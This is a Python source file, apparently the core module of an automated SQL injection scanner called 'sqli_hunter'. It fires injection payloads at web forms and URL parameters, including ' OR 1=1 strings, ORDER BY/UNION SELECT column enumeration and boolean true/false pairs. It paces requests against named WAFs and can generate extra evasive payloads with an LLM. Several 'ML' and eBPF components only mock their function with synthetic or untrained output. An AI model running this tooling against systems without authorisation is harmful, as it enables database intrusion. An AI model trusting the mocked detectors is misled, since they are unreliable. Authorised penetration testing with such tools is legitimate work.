# -*- coding: utf-8 -*-
import traceback
import asyncio
from playwright.async_api import BrowserContext, Page, Error
import re
from urllib.parse import urlparse, parse_qs, urljoin
import time
import statistics
import uuid
import random
import itertools
import ahocorasick
from simhash import Simhash
import dns.asyncresolver
import cloudscraper
from bs4 import BeautifulSoup
from sqli_hunter.bootstrap import load_config
from sqli_hunter.payloads import SQL_ERROR_PATTERNS
from sqli_hunter.tamper import apply_tampers
from sqli_hunter.ast_payload_generator import AstPayloadGenerator
from sqli_hunter.bayesian_tamper_optimizer import BayesianTamperOptimizer, TAMPER_CATEGORIES
from sqli_hunter.db_fingerprinter import BEHAVIORAL_PROBES
from sqli_hunter.ml_classifier import LSTMAnomalyClassifier
from sqli_hunter.polymorphic_engine import PolymorphicEngine
import sqlglot
from typing import Callable, Awaitable, Any, Tuple, List, Set, Dict
from collections import defaultdict
from rich.console import Console
from rich.panel import Panel
import json
try:  # Optional dependencies used for graph-based analysis
    import networkx as nx
    from torch_geometric.nn import TransformerConv
    from torch_geometric.utils import from_networkx
    import torch
    import zmq
except Exception:  # pragma: no cover - tests run without heavy deps
    nx = None  # type: ignore
    TransformerConv = None  # type: ignore
    from_networkx = None  # type: ignore
    torch = None  # type: ignore


class TransformerQueryAnalyzer:
    """Lightweight transformer-based semantic scorer.

    In a full implementation this would load a pre-trained Transformer model
    to assess whether extracted SQL fragments resemble malicious queries. To
    keep dependencies small for the training environment, the default scorer
    falls back to a simple token-based heuristic when no model is available.
    """

    def __init__(self) -> None:
        try:  # pragma: no cover - heavy dependency, optional
            from transformers import AutoTokenizer, AutoModel
            self.tokenizer = AutoTokenizer.from_pretrained(
                "distilbert-base-uncased", local_files_only=True
            )
            self.model = AutoModel.from_pretrained(
                "distilbert-base-uncased", local_files_only=True
            )
        except Exception:  # Transformer model not available
            self.tokenizer = None
            self.model = None

    def score(self, query: str) -> float:
        if self.tokenizer and self.model:
            try:  # pragma: no cover - optional path
                import torch

                inputs = self.tokenizer(query, return_tensors="pt")
                with torch.no_grad():
                    outputs = self.model(**inputs)
                embedding = outputs.last_hidden_state.mean().item()
                return min(abs(embedding) % 1.0, 1.0)
            except Exception:
                return 0.0

        tokens = query.lower().split()
        suspicious = {"select", "union", "and", "or"}
        if not tokens:
            return 0.0
        overlap = sum(1 for t in tokens if t in suspicious)
        return overlap / len(tokens)


class GraphTransformerScorer:
    """Scores SQL ASTs using a lightweight graph transformer model.

    When :mod:`torch_geometric` is available the AST is converted to a graph
    and passed through a tiny :class:`TransformerConv` layer.  Otherwise a
    simple structural heuristic based on the number of nodes/edges is used.
    """

    def __init__(self) -> None:
        self.model = None
        if nx and TransformerConv and torch:  # pragma: no cover - optional path
            try:
                self.model = TransformerConv(in_channels=1, out_channels=1, heads=1)
            except Exception:
                self.model = None

    def _ast_to_graph(self, ast):
        if not nx:
            return None

        graph = nx.DiGraph()

        def _add(node, parent=None):
            node_id = id(node)
            graph.add_node(node_id, label=type(node).__name__)
            if parent is not None:
                graph.add_edge(parent, node_id)
            # sqlglot AST nodes expose ``args`` attribute containing children
            for child in getattr(node, "args", {}).values():
                if isinstance(child, list):
                    for c in child:
                        if hasattr(c, "args"):
                            _add(c, node_id)
                elif hasattr(child, "args"):
                    _add(child, node_id)

        _add(ast)
        return graph

    def score(self, ast) -> float:
        graph = self._ast_to_graph(ast)
        if not graph:
            return 0.0
        if not self.model:
            # Heuristic: more complex graphs -> higher score
            max_size = 25.0
            return min((graph.number_of_nodes() + graph.number_of_edges()) / max_size, 1.0)
        try:  # pragma: no cover - optional path
            data = from_networkx(graph)
            x = torch.ones((graph.number_of_nodes(), 1))
            out = self.model(x, data.edge_index)
            score = float(out.mean().abs().item())
            return min(score % 1.0, 1.0)
        except Exception:
            return 0.0


class SideChannelCalibrator:
    """Calibrates CPU time jitter and query-plan noise for side-channel checks."""

    def __init__(self) -> None:
        self.jitter = None

    async def calibrate(self) -> None:
        """Measure baseline CPU jitter by executing a tight loop asynchronously."""
        samples = []
        for _ in range(5):
            start = time.perf_counter()
            for _ in range(10000):
                pass
            samples.append(time.perf_counter() - start)
            await asyncio.sleep(0)
        self.jitter = sum(samples) / len(samples) if samples else 0.0

    def normalize(self, duration: float) -> float:
        if not self.jitter:
            return duration
        return max(0.0, duration - self.jitter)


class MockEbpfAgent:
    """Mocks an eBPF agent that would normally be running in the kernel.

    In a real-world scenario, this would use a library like bcc or libbpf
    to attach to kernel probes and collect data. For this simulation, it
    generates synthetic data.
    """
    def __init__(self):
        self.baseline_syscalls = random.randint(50, 150)
        self.baseline_jitter = random.uniform(0.0001, 0.001)

    def read_metrics(self, is_anomalous: bool = False) -> Tuple[float, int]:
        """Returns a tuple of (CPU jitter, syscall count)."""
        if is_anomalous:
            # Anomalous requests often trigger more syscalls (e.g., for error handling, logging)
            # and can cause more CPU jitter due to cache misses or context switching.
            jitter = self.baseline_jitter * random.uniform(1.5, 3.0)
            syscalls = self.baseline_syscalls + random.randint(20, 50)
        else:
            jitter = self.baseline_jitter * random.uniform(0.9, 1.1)
            syscalls = self.baseline_syscalls + random.randint(-5, 5)
        return jitter, syscalls


class VAEAnomalyScorer(torch.nn.Module if torch else object):
    """
    A Variational Autoencoder (VAE) for detecting anomalies in side-channel data.

    It learns a compressed representation of normal system behavior (CPU jitter,
    syscall counts) and flags inputs with high reconstruction error as anomalous.
    """
    def __init__(self, input_dim=2, latent_dim=2):
        if not torch:
            self.is_trained = False
            return
        super(VAEAnomalyScorer, self).__init__()

        self.encoder = torch.nn.Sequential(
            torch.nn.Linear(input_dim, 8),
            torch.nn.ReLU(),
            torch.nn.Linear(8, 4),
            torch.nn.ReLU(),
        )
        self.fc_mu = torch.nn.Linear(4, latent_dim)
        self.fc_logvar = torch.nn.Linear(4, latent_dim)
        self.decoder = torch.nn.Sequential(
            torch.nn.Linear(latent_dim, 4),
            torch.nn.ReLU(),
            torch.nn.Linear(4, 8),
            torch.nn.ReLU(),
            torch.nn.Linear(8, input_dim),
            torch.nn.Sigmoid() # Assuming normalized inputs
        )
        # NOTE: In a real application, this model would be pre-trained on
        # baseline data from the target application.
        self.is_trained = True # Mocking a trained state

    def encode(self, x):
        h = self.encoder(x)
        return self.fc_mu(h), self.fc_logvar(h)

    def reparameterize(self, mu, logvar):
        std = torch.exp(0.5 * logvar)
        eps = torch.randn_like(std)
        return mu + eps * std

    def decode(self, z):
        return self.decoder(z)

    def forward(self, x):
        mu, logvar = self.encode(x.view(-1, 2))
        z = self.reparameterize(mu, logvar)
        return self.decode(z), mu, logvar

    def score(self, metrics: Tuple[float, int]) -> float:
        """
        Calculates the anomaly score based on reconstruction error.
        A score closer to 1.0 indicates a higher probability of being an anomaly.
        """
        if not (torch and self.is_trained):
            return 0.0
        # Normalize metrics to be in a similar range, e.g., [0, 1]
        # These normalization factors would be determined during calibration.
        norm_jitter = min(metrics[0] * 1000, 1.0) # e.g. scale 0.001 to 1.0
        norm_syscalls = min(metrics[1] / 200.0, 1.0) # e.g. scale 200 to 1.0

        input_tensor = torch.tensor([norm_jitter, norm_syscalls], dtype=torch.float32)

        with torch.no_grad():
            recon, _, _ = self.forward(input_tensor)
            recon_error = torch.nn.functional.mse_loss(recon, input_tensor.view(-1, 2))

        # Scale the error to a [0, 1] range. The max_error would be a calibrated value.
        max_error = 0.1
        anomaly_score = min(recon_error.item() / max_error, 1.0)
        return anomaly_score


class DistributedScanner:
    """Very small asyncio/ZeroMQ based task distributor."""

    def __init__(self, endpoint: str = "inproc://sqli-hunter") -> None:
        self.endpoint = endpoint
        try:  # pragma: no cover - optional dependency
            import zmq.asyncio as zasyncio  # type: ignore

            self._zasyncio = zasyncio
            self._ctx = zasyncio.Context.instance()
            self._queue = None
        except Exception:
            self._zasyncio = None
            self._ctx = None
            self._queue = asyncio.Queue()

    async def worker(self, handler: Callable[[dict], Awaitable[None]]) -> None:
        if self._zasyncio:
            sock = self._ctx.socket(zmq.PULL)
            sock.bind(self.endpoint)
            while True:
                task = await sock.recv_json()
                await handler(task)
        else:  # fallback for environments without ZeroMQ
            while True:
                task = await self._queue.get()
                await handler(task)

    async def submit(self, task: dict) -> None:
        if self._zasyncio:
            sock = self._ctx.socket(zmq.PUSH)
            sock.connect(self.endpoint)
            await sock.send_json(task)
        else:
            await self._queue.put(task)

WAF_TEMPO_MAP = { "Cloudflare": 1.5, "AWS WAF": 0.5, "Imperva (Incapsula)": 1.0 }
MAX_BACKOFF_DELAY = 60.0
ANOMALY_CONFIRMATION_THRESHOLD = 0.8 # Score needed to trigger secondary analysis

class Scanner:
    QUICK_SCAN_PAYLOADS = [
        "'", '"', "#", ";", "')", "'))", "'))--", "'))-- ",
        "' OR 1=1--", '" OR 1=1--', "' OR '1'='1", '" OR "1"="1',
        "' OR 1=1#", "' OR 1=1-- ", "' OR 'x'='x",
    ]

    def __init__(self, browser_context: BrowserContext, scraper: cloudscraper.CloudScraper, canary_store: Dict, waf_name: str | None = None, n_calls: int = 20, debug: bool = False, adv_tamper: bool = False, use_diffusion: bool = False, use_llm_mutator: bool = False):
        self.context = browser_context
        self.scraper = scraper
        self.debug = debug
        self.console = Console()
        self.vulnerable_points = []
        self.lock = asyncio.Lock()
        self.dns_resolver = dns.asyncresolver.Resolver()
        self.canary_store = canary_store
        self.static_request_delay = WAF_TEMPO_MAP.get(waf_name, 0)
        self.rate_limit_active = False
        self.rate_limit_delay = 1.0
        self.successful_requests_since_rl = 0
        self.payload_generator = AstPayloadGenerator(dialect="mysql")
        self.adv_tamper = adv_tamper
        self.use_diffusion = use_diffusion
        self.use_llm_mutator = use_llm_mutator
        self.n_calls = n_calls
        if self.static_request_delay > 0: print(f"[*] WAF policy adaptation: Applying a {self.static_request_delay}s delay between requests.")
        self.signature_automaton = self._build_signature_automaton()
        self.ml_classifier = LSTMAnomalyClassifier()
        self.transformer_analyzer = TransformerQueryAnalyzer()
        self.graph_scorer = GraphTransformerScorer()
        self.calibrator = SideChannelCalibrator()
        self.ebpf_agent = MockEbpfAgent()
        self.side_channel_analyzer = VAEAnomalyScorer()

    def _build_signature_automaton(self) -> ahocorasick.Automaton | None:
        automaton = ahocorasick.Automaton()
        signatures = load_config("attack_signatures").get("signatures", [])
        try:
            for sig in signatures:
                pattern = sig.get("pattern", "").lower()
                weight = sig.get("weight", 0.0)
                if pattern:
                    automaton.add_word(pattern, (pattern, weight))
            automaton.make_automaton()
            return automaton
        except Exception as e:
            if self.debug:
                print(f"    [bold red]Debug: Failed to load signatures: {e}")
        return None

    def _update_rate_limit_status(self, status: int, is_waf_block: bool):
        is_rate_limited = status in [429, 503]
        if is_rate_limited:
            self.rate_limit_active = True; self.successful_requests_since_rl = 0
            new_delay = self.rate_limit_delay * 2; self.rate_limit_delay = min(new_delay, MAX_BACKOFF_DELAY)
            print(f"[!] Rate limit detected! Increasing backoff delay to {self.rate_limit_delay:.2f}s.")
        elif self.rate_limit_active and not is_waf_block:
            self.successful_requests_since_rl += 1
            if self.successful_requests_since_rl >= 10:
                self.rate_limit_delay = max(1.0, self.rate_limit_delay / 2); self.successful_requests_since_rl = 0
                print(f"[*] Rate limit seems to have eased. Reducing backoff delay to {self.rate_limit_delay:.2f}s.")
                if self.rate_limit_delay == 1.0: self.rate_limit_active = False; print("[*] Rate limiting deactivated.")

    async def _send_headless_request(self, url: str, method: str = "GET", params: dict = None, data: dict = None, json_data: dict = None, timeout: int = 30) -> tuple[str | None, float, bool, int]:
        start_time = time.monotonic()
        def sync_request():
            method_upper = method.upper()
            if method_upper == "GET": return self.scraper.get(url, params=params, timeout=timeout)
            elif method_upper == "POST":
                post_body = json_data if json_data is not None else data
                return self.scraper.post(url, params=params, data=post_body, json=json_data, timeout=timeout)
            else: raise NotImplementedError(f"Method {method_upper} not implemented")
        try:
            response = await asyncio.to_thread(sync_request)
            duration = time.monotonic() - start_time
            body = response.text
            status = response.status_code
            is_blocked = status in [403, 406] or any(s in body.lower() for s in ["request blocked", "forbidden", "waf"])
            self._update_rate_limit_status(status, is_blocked)
            if self.debug:
                request_info = f"[bold blue]URL:[/] {url}\n[bold blue]Method:[/] {method.upper()}\n[bold blue]Params:[/] {params}\n[bold blue]Data:[/] {data}\n[bold blue]JSON:[/] {json_data}"
                response_info = f"[bold blue]Status:[/] {status}\n[bold blue]Duration:[/] {duration:.4f}s\n[bold blue]Body:[/] {body[:500]}..."
                self.console.print(Panel(request_info, title="[bold cyan]Debug: Headless Request Sent", expand=False))
                self.console.print(Panel(response_info, title="[bold cyan]Debug: Headless Response Received", expand=False))
            return body, duration, is_blocked, status
        except Exception as e:
            if self.debug: self.console.print(Panel(f"Request to {url} failed: {e}", title="[bold red]Debug: Request Exception", expand=False))
            return None, time.monotonic() - start_time, False, 500

    async def _get_baseline(self, url: str, method: str, params: dict = None, data: dict = None, json_data: dict = None) -> tuple[int, float, Simhash | None, str | None]:
        """Sends multiple requests to establish a baseline for status, time, and content."""
        timings, bodies, statuses = [], [], []
        for _ in range(3):
            body, duration, is_blocked, status = await self._send_headless_request(url, method=method, params=params, data=data, json_data=json_data)
            if body and not is_blocked:
                timings.append(duration)
                bodies.append(body)
                statuses.append(status)
            await asyncio.sleep(0.5)
        if self.calibrator.jitter is None:
            await self.calibrator.calibrate()
        if not bodies:
            print("[!] Failed to establish a baseline. All baseline requests failed or were blocked.")
            return 500, 0.0, None, None
        baseline_body = bodies[0]
        baseline_status = statuses[0]
        baseline_time = statistics.median(timings) if timings else 0
        return baseline_status, baseline_time, Simhash(baseline_body), baseline_body

    def _analyze_response_for_anomalies(
        self,
        baseline_status: int,
        baseline_hash: Simhash,
        response_status: int,
        response_body: str,
        baseline_time: float | None = None,
        response_time: float | None = None,
        ebpf_metrics: Tuple[float, int] | None = None,
        graph_score: float | None = None,
    ) -> tuple[float, str | None]:
        """
        Analyzes a response against a baseline and returns an anomaly score (0.0 to 1.0)
        and the dialect inferred from an error message, if any.
        """
        other_score = 0.0
        regex_score = 0.0
        model_score = 0.0
        simhash_score = 0.0
        inferred_dialect = None
        if not response_body or not baseline_hash:
            return 0.0, None
        if response_status != baseline_status:
            other_score += 0.5 if response_status >= 400 else 0.2

        try:
            hash_distance = baseline_hash.distance(Simhash(response_body))
            simhash_score = min(hash_distance / 64.0, 1.0)
        except OverflowError:
            if self.debug:
                print("    [bold yellow]Debug: Simhash calculation failed due to an OverflowError. Skipping simhash score.[/bold yellow]")
            simhash_score = 0.0

        # Timing side-channel
        if baseline_time is not None and response_time is not None:
            base_norm = self.calibrator.normalize(baseline_time)
            resp_norm = self.calibrator.normalize(response_time)
            if resp_norm > base_norm * 1.5:
                other_score += 0.2

        # eBPF-based side-channel analysis using VAE
        if ebpf_metrics:
            vae_score = self.side_channel_analyzer.score(ebpf_metrics)
            other_score += vae_score * 0.4 # Weight the VAE score
            if self.debug:
                print(f"    [bold yellow]Debug: eBPF metrics: (jitter: {ebpf_metrics[0]:.6f}, syscalls: {ebpf_metrics[1]}). VAE score: {vae_score:.2f}")

        # Query-plan side-channel: look for tell-tale plan keywords
        plan_hit = re.search(r"(seq scan|index scan|query plan)", response_body, re.IGNORECASE)
        if plan_hit:
            other_score += 0.2

        # Aho-Corasick attack signature detection
        if self.signature_automaton:
            found_patterns: Set[str] = set()
            for _, (pattern, weight) in self.signature_automaton.iter(response_body.lower()):
                if pattern not in found_patterns:
                    regex_score += weight
                    found_patterns.add(pattern)
            if self.debug and found_patterns:
                print(f"    [bold yellow]Debug: Signature matches:[/] {', '.join(found_patterns)}")

        # Check for classic SQL error patterns and infer dialect
        for pattern in SQL_ERROR_PATTERNS:
            if re.search(pattern, response_body, re.IGNORECASE):
                if self.debug:
                    print(f"    [bold yellow]Debug: Found error pattern:[/] {pattern}")
                regex_score += 0.9
                if "mysql" in pattern:
                    inferred_dialect = "mysql"
                elif "ora-" in pattern:
                    inferred_dialect = "oracle"
                elif "postgresql" in pattern:
                    inferred_dialect = "postgresql"
                elif "sqlsrv" in pattern:
                    inferred_dialect = "mssql"
                break

        # AST extraction and ML scoring from response
        for fragment in self._extract_sql_fragments(response_body):
            try:
                ast = sqlglot.parse_one(fragment)
                ml_score = self.ml_classifier.score(ast)
                transformer_score = self.transformer_analyzer.score(fragment)

                graph_score_from_response = 0.0
                try:
                    if ast:
                        graph_score_from_response = self.graph_scorer.score(ast)
                except Exception as e:
                    if self.debug:
                        print(f"    [bold yellow]Debug: Graph scorer failed for fragment '{fragment[:50]}...': {e}[/bold yellow]")

                model_score += ml_score * 0.5 + transformer_score * 0.3 + graph_score_from_response * 0.2
                if self.debug and (ml_score > 0 or transformer_score > 0 or graph_score_from_response > 0):
                    print(
                        f"    [bold yellow]Debug: ML {ml_score:.2f} / TF {transformer_score:.2f} / GT {graph_score_from_response:.2f} for fragment: {fragment}"
                    )
            except Exception:
                continue

        # Add score from outgoing payload's AST graph
        if graph_score:
            model_score += graph_score * 0.3 # Add payload graph score, weighted
            if self.debug:
                print(f"    [bold yellow]Debug: Payload AST graph score: {graph_score:.2f}")

        combined = other_score + 0.5 * regex_score + 0.3 * simhash_score + 0.2 * model_score
        return min(combined, 1.0), inferred_dialect

    def _extract_sql_fragments(self, text: str) -> List[str]:
        """Extract potential SQL snippets from response text."""
        pattern = re.compile(r"(select|insert|update|delete|union)[^;]+", re.IGNORECASE)
        return [m.group(0) for m in pattern.finditer(text)]

    async def _confirm_boolean_anomaly(self, url, method, create_request_args, context) -> bool:
        """Sends true/false payloads to confirm a suspected boolean-based vulnerability."""
        print("    [+] Anomaly detected. Launching secondary confirmation (Boolean)...")
        true_payload = self._contextualize_string_payload(" AND 1=1", context)
        false_payload = self._contextualize_string_payload(" AND 1=2", context)

        true_args = await create_request_args(true_payload)
        true_body, _, _, _ = await self._send_headless_request(url, method, **true_args)

        false_args = await create_request_args(false_payload)
        false_body, _, _, _ = await self._send_headless_request(url, method, **false_args)

        if true_body and false_body and Simhash(true_body).distance(Simhash(false_body)) > 5:
            print("    [bold green][+] Confirmed Boolean-Based SQLi![/bold green]")
            return True
        return False

    async def _fuzz_parameter_for_anomalies(self, url: str, method: str, param_name: str, original_value: str, create_request_args: Callable, baseline_status: int, baseline_hash: Simhash, baseline_time: float, base_data: dict) -> bool:
        """Fuzzes a parameter, scores responses for anomalies, and confirms vulnerabilities."""
        print(f"  [*] Fuzzing for anomalies on param '{param_name}'...")
        fuzz_string = "sqlihunter"

        # Generate payloads: start with basics and add advanced ones if enabled
        payloads_to_test = list(self.QUICK_SCAN_PAYLOADS)
        if self.use_diffusion or self.use_llm_mutator:
            print(f"  [*] Generating advanced payloads (Diffusion: {self.use_diffusion}, LLM: {self.use_llm_mutator})")
            poly_engine = PolymorphicEngine()
            advanced_payloads = poly_engine.generate(
                "' OR 1=1 --",
                num_variations=20,
                use_diffusion=self.use_diffusion,
                use_llm=self.use_llm_mutator,
                prompt="Create a tricky SQL injection payload"
            )
            payloads_to_test.extend(advanced_payloads)
            print(f"  [*] Testing with {len(payloads_to_test)} total payloads.")

        for payload in payloads_to_test:
            # Generate a score for the payload's AST complexity before sending
            graph_score = 0.0
            try:
                payload_ast = sqlglot.parse_one(payload, read="mysql")
                if payload_ast:
                    graph_score = self.graph_scorer.score(payload_ast)
            except Exception:
                pass # Ignore payloads that can't be parsed

            for injected_value in [original_value + payload, fuzz_string + payload, payload]:
                final_request_args = await create_request_args(injected_value)
                body, duration, is_blocked, status = await self._send_headless_request(url, method, **final_request_args)
                if is_blocked or not body: continue

                # Simulate eBPF data collection for the request
                is_anomalous_probe = any(p in injected_value for p in self.QUICK_SCAN_PAYLOADS)
                ebpf_metrics = self.ebpf_agent.read_metrics(is_anomalous=is_anomalous_probe)

                anomaly_score, inferred_dialect = self._analyze_response_for_anomalies(
                    baseline_status, baseline_hash, status, body, baseline_time, duration,
                    ebpf_metrics=ebpf_metrics, graph_score=graph_score
                )

                if anomaly_score >= ANOMALY_CONFIRMATION_THRESHOLD:
                    if inferred_dialect: # Found a high-confidence error pattern
                        await self._report_vulnerability(url, "Error-Based SQLi", param_name, injected_value, ("anomaly_scan",), method, final_request_args, inferred_dialect, baseline_time=baseline_time)
                        return True

                    page = await self.context.new_page()
                    try:
                        context = await self._perform_taint_analysis(page, url, method, create_request_args)
                        if await self._confirm_boolean_anomaly(url, method, create_request_args, context):
                            await self._report_vulnerability(url, "Boolean-Based SQLi", param_name, injected_value, ("anomaly_confirmation",), method, final_request_args, baseline_time=baseline_time)
                            return True
                    finally:
                        await page.close()
        return False

    async def _union_based_scan(self, url: str, method: str, param_name: str, original_value: str, create_request_args: Callable, baseline_hash: Simhash) -> bool:
        """Performs a UNION-based SQLi scan."""
        print(f"  [*] Starting UNION-based scan for param '{param_name}'...")
        column_count = -1
        break_out_chars = ["'", '"', "')"]
        prefix_used = ""
        for prefix in break_out_chars:
            for i in range(1, 26):
                payload = f"{prefix} AND 1=2 ORDER BY {i}-- "
                args = await create_request_args(original_value + payload)
                body, _, is_blocked, _ = await self._send_headless_request(url, method, **args)
                if is_blocked or not body: continue
                is_different = False
                try:
                    if baseline_hash and Simhash(body).distance(baseline_hash) > 5:
                        is_different = True
                except OverflowError:
                    if self.debug:
                        print("    [bold yellow]Debug: Simhash calculation failed during UNION scan. Assuming content is different.[/bold yellow]")
                    is_different = True

                if is_different:
                    column_count = i - 1
                    print(f"    [+] Potential column count found: {column_count} with prefix '{prefix}'")
                    prefix_used = prefix
                    break
            if column_count != -1:
                break
        if column_count <= 0:
            print("    [-] Could not determine column count for UNION scan.")
            return False
        marker = "sqlihunter" + uuid.uuid4().hex[:6]
        nulls = ["NULL"] * column_count
        for i in range(column_count):
            union_payload_parts = nulls[:]
            marker_payload = "CHAR(" + ",".join([str(ord(c)) for c in marker]) + ")"
            union_payload_parts[i] = marker_payload
            union_payload = f"{prefix_used} AND 1=2 UNION SELECT {','.join(union_payload_parts)}-- "
            args = await create_request_args(original_value + union_payload)
            body, _, is_blocked, _ = await self._send_headless_request(url, method, **args)
            if is_blocked or not body: continue
            if marker in body:
                print(f"    [+] UNION-based SQLi confirmed! Marker found in response.")
                union_info = {"column_count": column_count, "prefix": prefix_used, "marker_col": i}
                # We don't know the dialect for sure here, so we pass it as generic
                await self._report_vulnerability(url, "UNION-based SQLi", param_name, union_payload, ("union_scan",), method, args, "generic", union_info)
                return True
        print("    [-] UNION-based scan did not find a vulnerability.")
        return False

    async def _boolean_based_ast_scan(self, url: str, method: str, param_name: str, create_request_args: Callable) -> bool:
        """
        Performs a boolean-based scan using the AST payload generator, supporting tampering.
        This method tests for vulnerabilities by comparing the responses of true/false payload pairs.
        """
        print(f"  [*] Starting AST-based boolean scan for param '{param_name}' (Tamper mode: {'On' if self.adv_tamper else 'Off'})...")
        # For now, we assume a simple context. This can be improved with taint analysis.
        context = "HTML_ATTRIBUTE_SINGLE_QUOTED"

        # Generate payload pairs (both standard and tampered if adv_tamper is on)
        payload_pairs = self.payload_generator.generate("BOOLEAN_BASED", context=context, tamper=self.adv_tamper)

        for true_payload, false_payload, family in payload_pairs:
            true_args = await create_request_args(true_payload)
            true_body, _, is_blocked_true, _ = await self._send_headless_request(url, method, **true_args)
            if is_blocked_true or not true_body: continue

            false_args = await create_request_args(false_payload)
            false_body, _, is_blocked_false, _ = await self._send_headless_request(url, method, **false_args)
            if is_blocked_false or not false_body: continue

            is_different = False
            try:
                if Simhash(true_body).distance(Simhash(false_body)) > 5:
                    is_different = True
            except OverflowError:
                if self.debug:
                    print("    [bold yellow]Debug: Simhash calculation failed during AST scan. Assuming content is different.[/bold yellow]")
                is_different = True

            if is_different:
                vuln_type = "Boolean-Based SQLi (AST)"
                if self.adv_tamper:
                    vuln_type += " (Tampered)"
                print(f"    [bold green][+] Confirmed {vuln_type}![/bold green]")
                await self._report_vulnerability(url, vuln_type, param_name, true_payload, (family,), method, true_args)
                return True # Stop after finding one vulnerability with this method

        print(f"    [-] AST-based boolean scan did not find a vulnerability for param '{param_name}'.")
        return False

    async def _perform_taint_analysis(self, page: Page, url: str, method: str, create_request_args: Callable) -> str:
        """Performs taint analysis using headless response parsing instead of browser rendering."""
        taint = "sqlihunter" + uuid.uuid4().hex[:8]
        args = await create_request_args(taint)
        body, _, _, _ = await self._send_headless_request(url, method, **args)
        if not body or taint not in body: return "HTML_TEXT"
        soup = BeautifulSoup(body, 'html.parser')
        if soup.find(text=re.compile(taint)): return "HTML_TEXT"
        if soup.find(attrs={'value': re.compile(taint)}) or soup.find(attrs={'href': re.compile(taint)}): return "HTML_ATTRIBUTE"
        if soup.find('script', text=re.compile(taint)): return "JS_STRING"
        return "HTML_TEXT"

    def _contextualize_string_payload(self, payload: str, context: str) -> str:
        """Adds context-specific prefixes/suffixes to a raw string payload."""
        if context in ["HTML_ATTRIBUTE_SINGLE_QUOTED", "JS_STRING_SINGLE_QUOTED", "HTML_ATTRIBUTE"]:
            sql = "'" + payload + "-- "
        elif context in ["HTML_ATTRIBUTE_DOUBLE_QUOTED", "JS_STRING_DOUBLE_QUOTED"]:
            sql = '"' + payload + "-- "
        else:
            if payload.strip().startswith(';'): sql = "'" + payload + "-- "
            else: sql = payload + "-- "
        return sql

    async def scan_target(self, target_item: dict, collaborator_url: str | None = None):
        """Main entry point for scanning a single target (URL, form, etc.)."""
        target_type, url = target_item.get("type"), target_item.get("url")
        method = target_item.get("method", "GET").upper()

        if target_type == 'form':
            inputs = target_item.get("inputs", [])
            base_data = {}
            for inp in inputs:
                name = inp.get("name")
                if not name: continue
                if inp.get("value"): base_data[name] = inp.get("value")
                else:
                    if inp.get("type") == "password": base_data[name] = "123456"
                    elif inp.get("type") == "email": base_data[name] = "test@test.com"
                    else: base_data[name] = "test"

            baseline_status, baseline_time, baseline_hash, baseline_body = await self._get_baseline(url, method, data=base_data)
            if not baseline_hash: return

            for input_to_test in inputs:
                param_name = input_to_test.get("name")
                if not param_name or input_to_test.get("type") not in ["text", "textarea", "password", "email", "search", "url", "tel"]: continue
                original_value_for_param = next((i.get("value", "") for i in inputs if i.get("name") == param_name), "")
                async def create_request_args(p_value):
                    fuzz_data = base_data.copy()
                    fuzz_data[param_name] = p_value
                    return {'data': fuzz_data}
                is_vuln = await self._fuzz_parameter_for_anomalies(url, method, param_name, original_value_for_param, create_request_args, baseline_status, baseline_hash, baseline_time, base_data)
                if is_vuln: return

                # If no other vuln found, try for UNION based
                is_union_vuln = await self._union_based_scan(url, method, param_name, original_value_for_param, create_request_args, baseline_hash)
                if is_union_vuln: return

                is_ast_vuln = await self._boolean_based_ast_scan(url, method, param_name, create_request_args)
                if is_ast_vuln: return

        elif target_type == 'url':
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            if not query_params: return

            baseline_status, baseline_time, baseline_hash, baseline_body = await self._get_baseline(url, method, params=query_params)
            if not baseline_hash: return

            for param_name, values in query_params.items():
                original_value = values[0] if values else ""
                async def create_request_args(p_value):
                    new_params = query_params.copy()
                    new_params[param_name] = p_value
                    return {'params': new_params}

                is_vuln = await self._fuzz_parameter_for_anomalies(url, method, param_name, original_value, create_request_args, baseline_status, baseline_hash, baseline_time, query_params)
                if is_vuln: return

                is_union_vuln = await self._union_based_scan(url, method, param_name, original_value, create_request_args, baseline_hash)
                if is_union_vuln: return

                is_ast_vuln = await self._boolean_based_ast_scan(url, method, param_name, create_request_args)
                if is_ast_vuln: return
        else:
            if self.debug: print(f"[!] Skipping target with unhandled type: {target_type}")

    async def _report_vulnerability(self, url: str, vuln_type: str, param: str, payload: str, chain: tuple, method: str, request_data: dict, dialect: str | None = None, union_info: dict = None, baseline_time: float = 0.0):
        """Stores vulnerability details, including method, request data, dialect, and union info."""
        vuln_info = {
            "url": url,
            "type": vuln_type,
            "parameter": param,
            "payload": payload,
            "tamper_chain": list(chain),
            "method": method,
            "request_data": request_data,
            "dialect": dialect,
            "union_info": union_info,
            "baseline_time": baseline_time
        }
        async with self.lock:
            if not any(v['url'] == url and v['parameter'] == param for v in self.vulnerable_points):
                self.console.print(Panel(json.dumps(vuln_info, indent=2), title="[bold red]Vulnerability Found!", expand=False))
                self.vulnerable_points.append(vuln_info)

    async def distributed_scan(self, targets: List[dict]) -> List[Any]:
        """Coordinate distributed scanning using asyncio and optional ZeroMQ.

        Each target dict is passed to :meth:`scan_target`.  When the
        :mod:`zmq` library is available, a context is created to signal that the
        system could distribute work across workers; in this simplified
        implementation we still execute scans locally.
        """

        results = []
        try:  # pragma: no cover - optional dependency
            import zmq.asyncio  # type: ignore
            _ = zmq.asyncio.Context.instance()
        except Exception:
            pass
        for t in targets:
            results.append(await self.scan_target(t))
        return results
